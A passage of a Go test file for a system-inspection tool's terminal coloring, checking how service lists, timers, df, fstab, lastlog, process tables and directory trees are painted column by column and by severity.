// — the unit's own and the vendor preset — each painted by its value, so a unit
// that boots reads apart from one that was talked out of it.
func TestUnitFileStateWordsPaintedByValue(t *testing.T) {
	pad := func(text string, width int) string { return text + strings.Repeat(" ", width-len(text)) }
	styler := newLineStyler("unit-files")
	hasSpan := func(spans []paintSpan, line, word string, want style) bool {
		start := strings.Index(line, word)
		for _, span := range spans {
			if span.Start == start && span.End == start+len(word) && span.Style == want {
				return true
			}
		}
		return false
	}
	enabled := pad("ssh.service", 32) + pad("enabled", 16) + "enabled"
	if !hasSpan(styler(enabled), enabled, "enabled", style{FG: "2"}) {
		t.Fatalf("enabled should be painted green: %+v", styler(enabled))
	}
	disabled := pad("ufw.service", 32) + pad("disabled", 16) + "enabled"
	if !hasSpan(styler(disabled), disabled, "disabled", dimStyle) {
		t.Fatalf("disabled should be Faint: %+v", styler(disabled))
	}
	if unitFileStateStyles["enabled"] == unitFileStateStyles["disabled"] {
		t.Fatal("enabled and disabled wear one color")
	}
	// A row with no state word — the header, the closing count — takes the name
	// column alone rather than the word-by-word cycle a generic table gets.
	header := "UNIT FILE            STATE           PRESET"
	spans := styler(header)
	if len(spans) != 1 || spans[0].Style != tableColumnStyles[0] {
		t.Fatalf("the header should take the name column alone: %+v", spans)
	}
}

// list-timers' NEXT/LAST dates span several words ("Thu 2026-07-30 00:00:00
// UTC"); the lexer reads the row as the six cells it is and paints each whole,
// where the generic table styler colored one date in four colors.
func TestTimersPaintWholeDateCells(t *testing.T) {
	line := "Thu 2026-07-30 00:00:00 UTC  2h 30min left  Wed 2026-07-29 21:30:00 UTC  1h 30min ago  " +
		"logrotate.timer  logrotate.service"
	want := "Thu 2026-07-30 00:00:00 UTC=244 Wed 2026-07-29 21:30:00 UTC=244 2h 30min left=2 " +
		"1h 30min ago= logrotate.timer=4 logrotate.service=6"
	if got := spansOf(line, timersRow(line)); got != want {
		t.Fatalf("spans = %q, want %q", got, want)
	}
	// A timer that never ran carries n/a in both date cells, which are single
	// words rather than four.
	never := "n/a                          n/a                             n/a                       " +
		"n/a                        apt-daily.timer  apt-daily.service"
	want = "n/a=244 n/a=244 n/a=2 n/a= apt-daily.timer=4 apt-daily.service=6"
	if got := spansOf(never, timersRow(never)); got != want {
		t.Fatalf("spans = %q, want %q", got, want)
	}
	// The header and the closing count are not rows of the table.
	for _, plain := range []string{"NEXT  LEFT  LAST  PASSED  UNIT  ACTIVATES", "4 timers listed."} {
		if spans := timersRow(plain); spans != nil {
			t.Errorf("%q should carry no color: %+v", plain, spans)
		}
	}
}

// A section override styles that section with its own rule; the rest keep the
// check syntax. Glob titles let dynamic per-file sections match too.
func TestSectionSyntaxOverridesByTitle(t *testing.T) {
	check := &model.Check{
		ID: "skel", Syntax: model.SyntaxBash,
		SectionSyntax: []model.SectionSyntax{
			{Title: "/etc/skel", Syntax: model.SyntaxLsL},
			{Title: "/home/*/.*_history", Syntax: model.SyntaxColon},
		},
	}
	if got := sectionSyntax(check, "/etc/skel"); got != "ls-l" {
		t.Fatalf("the listing section should take the override: %q", got)
	}
	if got := sectionSyntax(check, "/etc/skel/.bashrc"); got != "bash" {
		t.Fatalf("other sections keep the check syntax: %q", got)
	}
	if got := sectionSyntax(check, "/home/deploy/.zsh_history"); got != "colon" {
		t.Fatalf("a glob should match dynamic titles: %q", got)
	}
	if got := sectionSyntax(&model.Check{Syntax: model.SyntaxBash}, "/etc/skel"); got != "bash" {
		t.Fatalf("no overrides means the check syntax everywhere: %q", got)
	}
}

// End to end through the panel: a services document rendered under the units
// syntax paints the state cells by meaning.
func TestUnitsPanelPaintsStateCells(t *testing.T) {
	result := &model.CheckResult{
		Check:   &model.Check{ID: "services", Aspect: model.AspectService, Syntax: model.SyntaxUnits},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{{Lines: []model.Line{
			{Text: "UNIT             LOAD   ACTIVE   SUB        DESCRIPTION", Severity: model.Info},
			{Text: "sshd.service     loaded active   running    OpenBSD server", Severity: model.Info},
			{Text: "certbot.service  loaded active   exited     Certbot renewal", Severity: model.Info},
		}}}},
	}
	panel := checkPanel(result, 40, 120, true)
	if !strings.Contains(panel, style{FG: "2"}.Style().Render("running")) {
		t.Fatalf("running should be green in the panel:\n%s", plain(panel))
	}
	if !strings.Contains(panel, dimStyle.Style().Render("exited")) {
		t.Fatalf("exited should be faint in the panel:\n%s", plain(panel))
	}
}

// End to end through the panel: the SysV rows the services check also collects
// (`service --status-all`) paint the bracketed marker as one field in its state
// color — not one color per glyph — and the name in the first column color, the
// one the systemd table gives its UNIT column.
func TestUnitsPanelPaintsSysvStateMarkers(t *testing.T) {
	result := &model.CheckResult{
		Check:   &model.Check{ID: "services", Aspect: model.AspectService, Syntax: model.SyntaxUnits},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{{Title: "service", Lines: []model.Line{
			{Text: " [ + ]  apache2", Severity: model.Info},
			{Text: " [ - ]  cron", Severity: model.Info},
			{Text: " [ ? ]  dnsmasq", Severity: model.Info},
		}}}},
	}
	panel := checkPanel(result, 40, 120, true)
	if !strings.Contains(panel, style{FG: "2"}.Style().Render("[ + ]")) {
		t.Fatalf("a running marker should be green as one field:\n%s", plain(panel))
	}
	if !strings.Contains(panel, dimStyle.Style().Render("[ - ]")) ||
		!strings.Contains(panel, dimStyle.Style().Render("[ ? ]")) {
		t.Fatalf("stopped and unknown markers should be Faint:\n%s", plain(panel))
	}
	if !strings.Contains(panel, tableColumnStyles[0].Style().Render("apache2")) {
		t.Fatalf("the service name should take the first column color:\n%s", plain(panel))
	}
}

// Two signal rules over the same text: the painted span follows the reason, so
// the more severe rule wins whichever way the catalog orders them.
func TestLineTextMostSevereSpanWins(t *testing.T) {
	const text = "cap_setuid=ep"
	match := func(id string, severity model.Severity) model.Match {
		return model.Match{ID: id, Severity: severity, Message: id,
			Spans: []model.Span{{Start: 0, End: len(text)}}}
	}
	for _, matches := range [][]model.Match{
		{match("caps-setuid", model.Critical), match("caps-present", model.Low)},
		{match("caps-present", model.Low), match("caps-setuid", model.Critical)},
	} {
		got := lineText(model.Line{Text: text, Severity: model.Critical, Matches: matches}, nil)
		if !strings.Contains(got, criticalStyle.Style().Render(text)) {
			t.Fatalf("the critical span should paint over the lower one (order %v): %q", matches[0].ID, got)
		}
	}
}

// End to end through the panel: one panel, two section rules — the skel
// listing keeps the ls -l colors while the collected shell file keeps the
// bash lexer.
func TestSkelPanelKeepsLsColorsForTheListing(t *testing.T) {
	result := &model.CheckResult{
		Check: &model.Check{
			ID: "skel", Aspect: model.AspectPersistence, Syntax: model.SyntaxBash,
			SectionSyntax: []model.SectionSyntax{{Title: "/etc/skel", Syntax: model.SyntaxLsL}},
		},
		Outcome: model.Collected,
		Document: model.Document{Sections: []model.Section{
			{Title: "/etc/skel", Lines: []model.Line{
				{Text: "-rw-r--r-- 1 root root 921 Jan 01 12:34 /etc/skel/.bashrc", Severity: model.Info},
			}},
			{Title: "/etc/skel/.bashrc", Lines: []model.Line{
				{Text: "export EDITOR=vim", Severity: model.Info},
			}},
		}},
	}
	panel := checkPanel(result, 40, 120, true)
	if !strings.Contains(panel, style{FG: "2"}.Style().Render("Jan 01 12:34")) {
		t.Fatalf("the listing should keep the ls -l colors:\n%s", plain(panel))
	}
	if !strings.Contains(panel, keywordColor.Style().Render("export")) {
		t.Fatalf("the shell section should keep the bash lexer:\n%s", plain(panel))
	}
}

// df's header ends in the two-word "Mounted on": the capture-group header
// regex keeps it one column, so data rows line up and the mount point (the
// last column) stays plain.
func TestDfHeaderAnchorsMultiWordLastColumn(t *testing.T) {
	styler := newLineStyler("df")
	header := "Filesystem      Size  Used Avail Use% Mounted on"
	if spans := styler(header); spans != nil {
		t.Fatalf("the header should only record anchors: %v", spans)
	}
	row := "/dev/vda1        40G   15G   25G  38% /"
	spans := styler(row)
	painted := paintLine(row, spans)
	for i, want := range []string{"40G", "15G", "25G", "38%"} {
		if !strings.Contains(painted, tableColumnStyles[i+1].Style().Render(want)) {
			t.Fatalf("column %d should have its column color (%q): %q", i+1, want, plain(painted))
		}
	}
	for _, span := range spans {
		if span.Start <= len(row)-1 && span.End > len(row)-1 {
			t.Fatalf("the mount point (last column) should stay plain: %+v", spans)
		}
	}
}

// The accounting store's closing line is a remark about the file — where its
// records begin, or that it holds none — not a row of it: the word-by-word
// cycle would paint its parts, so the table styler leaves it plain.
func TestTableStylerLeavesTheStoreTrailerPlain(t *testing.T) {
	styler := newLineStyler("table")
	for _, line := range []string{
		"/var/log/btmp has no entries",
		"btmp begins Mon Oct  5 09:12:00 2026",
		"wtmp begins Mon Oct  5 22:04:11 2026",
		"wtmpdb begins Mon Oct  5 22:04:11 2026",
	} {
		if spans := styler(line); spans != nil {
			t.Fatalf("%q should stay plain: %+v", line, spans)
		}
	}
	row := "root     ssh          117.67.231.246   Mon Oct  5 22:04 - still logged in"
	if spans := styler(row); len(spans) == 0 {
		t.Fatal("a session row should still get column colors")
	}
}

// lastlog's header is mixed case, so the all-caps header test does not
// recognize it: the check declares its own syntax, which anchors the columns on
// the header and leaves the note line printed ahead of it plain — the
// word-by-word cycle is for headerless tables only. The two rows are the tool's
// own output, "Latest" included, one column right of the timestamps below it.
func TestLastlogStylerAnchorsOnItsHeader(t *testing.T) {
	styler := newLineStyler("lastlog")
	note := "note: /var/lib/lastlog/lastlog2.db present, /var/log/lastlog is frozen"
	if spans := styler(note); spans != nil {
		t.Fatalf("a note ahead of the header should stay plain: %v", spans)
	}
	header := "Username         Port     From                                       Latest"
	if spans := styler(header); spans != nil {
		t.Fatalf("the header should only record anchors: %v", spans)
	}
	row := "root             pts/0    117.67.231.246                            Mon Oct  5 20:01:48 +0800 2026"
	spans := styler(row)
	painted := paintLine(row, spans)
	for i, want := range []string{"root", "pts/0", "117.67.231.246"} {
		if !strings.Contains(painted, tableColumnStyles[i].Style().Render(want)) {
			t.Fatalf("column %d should have its column color (%q): %q", i, want, plain(painted))
		}
	}
	latest := strings.Index(row, "Mon")
	for _, span := range spans {
		if span.Start >= latest {
			t.Fatalf("the timestamp column should stay plain: %+v", spans)
		}
	}
}

// A numeric column is right-aligned, so its value drifts left as the number
// grows wider. The pid column of top and ps aux changed color when a process
// count crossed ten: a one-digit pid starts two characters right of the header's
// anchor, and the tolerance-based lookup read it as the column after it. The
// row's field order settles the column, so every pid keeps the column it belongs
// to whatever its width. The rows are the tools' own layout (top right-aligns the
// pid in seven columns, ps aux in the twelve that end at the third character of
// "PID").
func TestTableStylerKeepsThePIDColumnAtEveryWidth(t *testing.T) {
	cases := []struct {
		syntax model.Syntax
		column int
		header string
		row    func(pid string) string
	}{
		{model.SyntaxTop, 0,
			"    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND",
			func(pid string) string {
				return fmt.Sprintf("%7s %s", pid, "root      20   0  102528   7880   4156 S   0.0   0.4   0:01.18 systemd")
			}},
		{model.SyntaxTable, 1,
			"USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND",
			func(pid string) string {
				return fmt.Sprintf("%s%12s  0.0  0.0  102528  7880 ?        S    13:41   0:01.18 systemd", "root", pid)
			}},
	}
	for _, tc := range cases {
		styler := newLineStyler(tc.syntax)
		if spans := styler(tc.header); spans != nil {
			t.Fatalf("%s: the header should only record anchors: %v", tc.syntax, spans)
		}
		for _, pid := range []string{"1", "9", "10", "99", "123", "1234", "12345", "123456", "1234567"} {
			row := tc.row(pid)
			painted := paintLine(row, styler(row))
			if !strings.Contains(painted, tableColumnStyles[tc.column].Style().Render(pid)) {
				t.Errorf("%s: the pid %q should carry column %d's color: %q",
					tc.syntax, pid, tc.column, plain(painted))
			}
			next := tableColumnStyles[(tc.column+1)%len(tableColumnStyles)].Style().Render(pid)
			if strings.Contains(painted, next) {
				t.Errorf("%s: the pid %q took the next column's color: %q", tc.syntax, pid, plain(painted))
			}
		}
	}
}

// fstab rows are colored by column: device blue, mount point green, filesystem// type magenta, options default, dump and pass dimmed; comments stay with the
// reader's comment muting.
func TestFstabColumns(t *testing.T) {
	styler := newLineStyler("fstab")
	if spans := styler("# <file system> <mount point> <type> <options> <dump> <pass>"); spans != nil {
		t.Fatalf("a comment should not be painted here: %v", spans)
	}
	row := "UUID=1a2b  /  ext4  errors=remount-ro  0  1"
	painted := paintLine(row, styler(row))
	if !strings.Contains(painted, style{FG: "4"}.Style().Render("UUID=1a2b")) {
		t.Fatalf("the device should be blue: %q", plain(painted))
	}
	if !strings.Contains(painted, style{FG: "2"}.Style().Render("/")) {
		t.Fatalf("the mount point should be green: %q", plain(painted))
	}
	if !strings.Contains(painted, style{FG: "5"}.Style().Render("ext4")) {
		t.Fatalf("the filesystem type should be magenta: %q", plain(painted))
	}
	if !strings.Contains(painted, dimStyle.Style().Render("0")) ||
		!strings.Contains(painted, dimStyle.Style().Render("1")) {
		t.Fatalf("dump and pass should be dimmed: %q", plain(painted))
	}
	if at := strings.Index(row, "errors=remount-ro"); at >= 0 {
		for _, span := range styler(row) {
			if span.Start <= at && span.End >= at+len("errors=remount-ro") {
				t.Fatalf("options should stay default: %+v", span)
			}
		}
	}
}

// The tree lexer colors a drawn lead by nesting: each bar the hue of the level
// it descends from, the branch glyph the node's own, and tree's own closing
// count muted; everything else — a root's label, a line no tree drew — stays
// plain. Both drawers feed it, so the records tree and the shaped tree color
// alike.
func TestTreeStylerColorsTheLeadByLevel(t *testing.T) {
	rec := func(pid, ppid, command string) model.BlockItem {
		return model.BlockItem{Rec: &model.Record{Fields: []model.Field{
			{Name: "PID", Value: pid}, {Name: "PPID", Value: ppid}, {Name: "COMMAND", Value: command},
		}}}
	}
	nest := form.Tree{ID: "PID", Parent: "PPID", Label: []string{"PID", "COMMAND"}}.Render(model.Block{
		Header: []string{"PID", "PPID", "COMMAND"},
		Items: []model.BlockItem{
			rec("1", "0", "/sbin/init"),
			rec("948", "1", "sshd"),
			rec("2210", "948", "bash"),
		},
	}, model.RenderOptions{Width: 80})
	if spans := styleTree(nest[0]); spans != nil {
		t.Errorf("a root's own line has no branch to color: %v", spans)
	}
	first := paintSpan{Start: 0, End: len("└── "), Style: form.LevelPaint(1)}
	if spans := styleTree(nest[1]); len(spans) != 1 || spans[0] != first {
		t.Errorf("a first-level glyph takes the cycle's first tint: %v", spans)
	}
	// A gap segment paints nothing, so the second-level glyph starts four bytes late.
	under := paintSpan{Start: len("    "), End: len("    ") + len("└── "), Style: form.LevelPaint(2)}
	if spans := styleTree(nest[2]); len(spans) != 1 || spans[0] != under {
		t.Errorf("the glyph under a closed branch takes its own level's hue: %v", spans)
	}

	drawn := shape.HomeTree("", "drwxr-x--- 5 lab lab 4096 Jul 29 17:40 /home\n"+
		"drwxr-x--- 5 lab lab 4096 Jul 29 17:40 /home/lab\n"+
		"-rw------- 1 lab lab 1929 Jul 29 17:49 /home/lab/.bash_history\n"+
		"drwx------ 2 lab lab 4096 Jul 29 13:41 /home/lab/.ssh\n"+
		"-rw------- 1 lab lab 99 Jul 29 13:41 /home/lab/.ssh/authorized_keys\n"+
		"drwxr-xr-x 2 lab lab 4096 Jan 06 16:23 /home/other user\n")
	if drawn == nil {
		t.Fatal("the listing rows should be drawn as a tree")
	}
	// /home/lab is a mid child of /home, so its own row carries a bar and a
	// glyph of adjacent levels; the file under the closed .ssh branch carries a
	// bar, a gap, then its glyph.
	sibling := "│   ├── [-rw------- lab lab 1929 Jul 29 17:49]  /home/lab/.bash_history"
	adjacent := []paintSpan{
		{Start: 0, End: len("│   "), Style: form.LevelPaint(1)},
		{Start: len("│   "), End: len("│   ") + len("├── "), Style: form.LevelPaint(2)},
	}
	if spans := styleTree(sibling); len(spans) != 2 || spans[0] != adjacent[0] || spans[1] != adjacent[1] {
		t.Errorf("a bar keeps its level's hue and the glyph takes the node's: %v", spans)
	}
	deep := "│       └── [-rw------- lab lab 99 Jul 29 13:41]  /home/lab/.ssh/authorized_keys"
	third := []paintSpan{
		{Start: 0, End: len("│   "), Style: form.LevelPaint(1)},
		{Start: len("│   ") + len("    "), End: len("│   ") + len("    ") + len("└── "), Style: form.LevelPaint(3)},
	}
	if spans := styleTree(deep); len(spans) != 2 || spans[0] != third[0] || spans[1] != third[1] {
		t.Errorf("a gap paints nothing and the third level's glyph takes its hue: %v", spans)
	}
	count := "3 directories, 2 files"
	for _, line := range []string{sibling, deep, count} {
		if !strings.Contains(drawn.Text, line) {
			t.Fatalf("the shaped tree should contain %q:\n%s", line, drawn.Text)
		}
	}
	if spans := styleTree(count); len(spans) != 1 || spans[0].Style != mutedStyle {
		t.Errorf("tree's own closing count should be muted: %v", spans)
	}
	if spans := styleTree("|-- ascii branches a non-UTF-8 locale prints"); spans != nil {
		t.Errorf("a line no tree of ours drew stays plain: %v", spans)
	}
}
